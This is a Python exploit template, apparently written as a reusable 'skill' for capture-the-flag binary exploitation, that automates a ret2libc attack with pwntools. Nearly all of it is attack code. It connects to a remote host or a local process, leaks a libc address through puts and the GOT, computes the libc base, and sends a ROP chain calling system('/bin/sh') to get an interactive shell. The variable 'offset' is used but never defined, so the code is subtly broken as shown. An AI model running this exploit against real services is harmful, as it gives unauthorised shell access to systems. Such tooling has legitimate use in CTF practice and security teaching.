"""
SKILL: ret2libc_base
DESCRIPTION: Automated ret2libc for 64-bit binaries with PIE disabled or leaked address.
PARAMETERS: binary_path, libc_path, host, port, leak_function_offset (optional)
RETURNS: Interactive shell or flag
REQUIRES: pwntools
TAGS: pwn, ret2libc, rop, x64
"""
from pwn import *

def exploit(binary_path, libc_path, host, port, leak_func='puts', leak_got='puts', return_to_main=True):
    context.binary = binary_path
    context.log_level = 'info'
    elf = ELF(binary_path)
    libc = ELF(libc_path)
    
    # Connect
    if host:
        p = remote(host, port)
    else:
        p = process(binary_path)
    
    # Stage 1: Leak libc address
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    
    payload = flat({
        offset: [
            pop_rdi,
            elf.got[leak_got],
            elf.plt[leak_func],
            elf.symbols['main'] if return_to_main else ret
        ]
    })
    p.sendline(payload)
    p.recvuntil(b'\n')  # adjust based on output
    leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.symbols[leak_got]
    log.success(f"libc base: {hex(libc.address)}")
    
    # Stage 2: System("/bin/sh")
    binsh = next(libc.search(b'/bin/sh'))
    system = libc.symbols['system']
    
    payload2 = flat({
        offset: [
            pop_rdi,
            binsh,
            ret,  # stack alignment for movaps
            system
        ]
    })
    p.sendline(payload2)
    p.interactive()